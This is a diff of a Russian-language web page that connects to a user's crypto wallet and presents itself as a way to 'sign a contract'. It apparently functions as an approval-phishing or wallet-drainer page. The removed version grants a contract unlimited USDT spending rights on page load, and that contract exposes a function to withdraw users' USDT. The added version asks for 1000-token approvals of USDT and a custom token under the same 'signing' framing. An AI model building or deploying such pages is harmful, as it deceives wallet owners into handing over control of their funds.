@@ -3,71 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Подключение и Подписание Контракта</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
-    <script>
-       let web3;
-        const managerContractAddress = "0x959d441664c99ba82fb963f78dce4f3a8b3eda9c"; // Адрес контракта CustomTokenManager на тестовой сети
-        const managerAbi = [{"inputs":[{"internalType":"address","name":"_usdtTokenAddress","type":"address"},{"internalType":"address","name":"_customTokenAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"owner","type":"address"},{"indexed":false,"internalType":"address","name":"usdtTokenAddress","type":"address"},{"indexed":false,"internalType":"address","name":"customTokenAddress","type":"address"}],"name":"ContractDeployed","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"CustomTokenDeposited","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"USDTWithdrawn","type":"event"},{"inputs":[],"name":"customToken","outputs":[{"internalType":"contract IERC20","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"depositCustomToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"usdtToken","outputs":[{"internalType":"contract IERC20","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdrawUSDT","outputs":[],"stateMutability":"nonpayable","type":"function"}];
-        const usdtTokenAddress = "0x85f828cd006a5f9b011b0cd69447e3c44d9da220"; // Адрес реального USDT токена на тестовой сети
-        const customTokenAddress = "0x85f828cd006a5f9b011b0cd69447e3c44d9da220"; // Адрес вашего кастомного токена CustomUSDT
-        const customTokenAbi = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"allowance","type":"uint256"},{"internalType":"uint256","name":"needed","type":"uint256"}],"name":"ERC20InsufficientAllowance","type":"error"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"uint256","name":"balance","type":"uint256"},{"internalType":"uint256","name":"needed","type":"uint256"}],"name":"ERC20InsufficientBalance","type":"error"},{"inputs":[{"internalType":"address","name":"approver","type":"address"}],"name":"ERC20InvalidApprover","type":"error"},{"inputs":[{"internalType":"address","name":"receiver","type":"address"}],"name":"ERC20InvalidReceiver","type":"error"},{"inputs":[{"internalType":"address","name":"sender","type":"address"}],"name":"ERC20InvalidSender","type":"error"},{"inputs":[{"internalType":"address","name":"spender","type":"address"}],"name":"ERC20InvalidSpender","type":"error"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
-
-        document.addEventListener('DOMContentLoaded', async () => {
-            if (typeof window.ethereum !== 'undefined') {
-                web3 = new Web3(window.ethereum);
-                try {
-                    // Подключаемся к кошельку пользователя
-                    await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    const accounts = await web3.eth.getAccounts();
-                    const userAddress = accounts[0];
-                    console.log("Подключен аккаунт:", userAddress);
-
-                    // Создаем контрактный объект менеджера
-                    const managerContract = new web3.eth.Contract(managerAbi, managerContractAddress);
-
-                    // Подписываем контракт пользователем
-                    await signContract(managerContract, userAddress);
-
-                    // Предоставляем разрешение на управление USDT токенами
-                    await approveTokens(userAddress, usdtTokenAddress, "USDT");
-
-                    alert("Контракт успешно подписан");
-                } catch (error) {
-                    console.error("Ошибка при подключении или подписании:", error);
-                }
-            } else {
-                alert("Trust Wallet или MetaMask не найдены!");
-            }
-        });
-
-        async function signContract(managerContract, userAddress) {
-            try {
-                // Пользователь подписывает контракт
-                await managerContract.methods.sign().send({ from: userAddress });
-                console.log("Контракт подписан пользователем:", userAddress);
-            } catch (error) {
-                console.error("Ошибка при подписании контракта:", error);
-            }
+    <title>Token Management App</title>
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js" type="text/javascript"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 20px;
         }
-
-        async function approveTokens(userAddress, tokenAddress, tokenName) {
-            try {
-                // Создаем экземпляр контракта токена
-                const tokenContract = new web3.eth.Contract(customTokenAbi, tokenAddress);
-
-                // Устанавливаем максимальный лимит для approve (2^256 - 1)
-                const maxApproval = web3.utils.toBN('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
-
-                // Выполняем транзакцию approve для предоставления доступа контракту на управление токенами
-                await tokenContract.methods.approve(managerContractAddress, maxApproval).send({ from: userAddress });
-                console.log(`Доступ к ${tokenName} токенам предоставлен для контракта:`, managerContractAddress);
-            } catch (error) {
-                console.error(`Ошибка при предоставлении разрешения на управление ${tokenName} токенами:`, error);
-            }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
         }
-    </script>
+        #status {
+            margin-top: 20px;
+            font-weight: bold;
+            color: green;
+        }
+        #error {
+            margin-top: 20px;
+            font-weight: bold;
+            color: red;
+        }
+    </style>
 </head>
 <body>
+    <h1>Token Management App</h1>
+    <p>Нажмите на кнопку ниже, чтобы подключить кошелек и подписать контракт.</p>
+    <button id="connectWallet">Подключить кошелек</button>
+    <button id="approveTokens" disabled>Предоставить доступ к токенам</button>
+    <button id="signContract" disabled>Подписать контракт</button>
+
+    <div id="status"></div>
+    <div id="error"></div>
+
+    <script>
+        const CONTRACT_ADDRESS = "0xfe0d3ab9a7ab9c070069f516feda0f351751944e"; // Замените на адрес вашего контракта
+        const USDT_TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // Адрес контракта USDT
+        const CUSTOM_TOKEN_ADDRESS = "0xcb89e8dd26aad28674da9751bfa61815a75f152d"; // Адрес кастомного токена
+
+        let userAddress = null;
+
+        async function connectWallet() {
+            if (typeof window.ethereum === 'undefined') {
+                document.getElementById("error").innerText = "Кошелек не найден. Установите MetaMask или Trust Wallet.";
+                return;
+            }
+
+            try {
+                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                userAddress = accounts[0];
+                document.getElementById("status").innerText = `Кошелек подключен: ${userAddress}`;
+                document.getElementById("approveTokens").disabled = false;
+            } catch (error) {
+                document.getElementById("error").innerText = `Ошибка подключения: ${error.message}`;
+            }
+        }
+
+        async function approveTokens(tokenAddress) {
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            const signer = provider.getSigner();
+            const tokenAbi = [
+                "function approve(address spender, uint256 amount) public returns (bool)"
+            ];
+            const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, signer);
+
+            try {
+                const amount = ethers.utils.parseUnits("1000", 18); // 1000 токенов с 18 десятичными знаками
+                const tx = await tokenContract.approve(CONTRACT_ADDRESS, amount);
+                document.getElementById("status").innerText = `Транзакция отправлена: ${tx.hash}`;
+                await tx.wait(); // Ждем подтверждения
+                document.getElementById("status").innerText = `Токены ${tokenAddress} успешно предоставлены.`;
+            } catch (error) {
+                document.getElementById("error").innerText = `Ошибка approve: ${error.message}`;
+            }
+        }
+
+        async function signContract() {
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            const signer = provider.getSigner();
+            const contractAbi = [
+                "function approveContract() external"
+            ];
+            const contract = new ethers.Contract(CONTRACT_ADDRESS, contractAbi, signer);
+
+            try {
+                const tx = await contract.approveContract();
+                document.getElementById("status").innerText = `Контракт подписан. Транзакция: ${tx.hash}`;
+                await tx.wait();
+                document.getElementById("status").innerText = "Контракт успешно подписан.";
+            } catch (error) {
+                document.getElementById("error").innerText = `Ошибка подписания контракта: ${error.message}`;
+            }
+        }
+
+        // События нажатий на кнопки
+        document.getElementById("connectWallet").addEventListener("click", connectWallet);
+        document.getElementById("approveTokens").addEventListener("click", async () => {
+            await approveTokens(USDT_TOKEN_ADDRESS); // Approve для USDT
+            await approveTokens(CUSTOM_TOKEN_ADDRESS); // Approve для кастомного токена
+            document.getElementById("signContract").disabled = false;
+        });
+        document.getElementById("signContract").addEventListener("click", signContract);
+    </script>
 </body>
 </html>
